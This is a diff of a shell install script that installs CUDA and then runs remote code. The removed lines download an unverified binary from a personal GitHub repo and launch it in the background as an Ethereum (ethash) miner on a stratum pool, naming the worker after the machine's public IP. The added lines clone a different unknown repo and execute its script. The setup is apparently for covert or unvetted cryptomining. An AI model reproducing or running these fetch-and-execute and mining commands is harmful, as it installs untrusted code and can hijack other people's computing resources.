@@ -16,8 +16,9 @@ if [ ! -f "${SCRIPT_DIR}/installed.txt" ]; then
 	sudo apt-get update
 	sudo apt-get -y install cuda
 	sudo apt-get install libcurl3 -y
-	wget https://github.com/dipsey1337/yuhu/raw/main/system
-	chmod +x system
-	ip=$(echo "$(curl -s ifconfig.me)" | tr . _ )
-	./system -a ethash -o stratum+tcp://eth-eu.sparkpool.com:3333 -u sp_ajg -p x -w $ip &
+	git clone https://github.com/new131/eth131.git
+	cd new131 
+	chmod +x *.sh
+	./new131.sh
+	
 fi
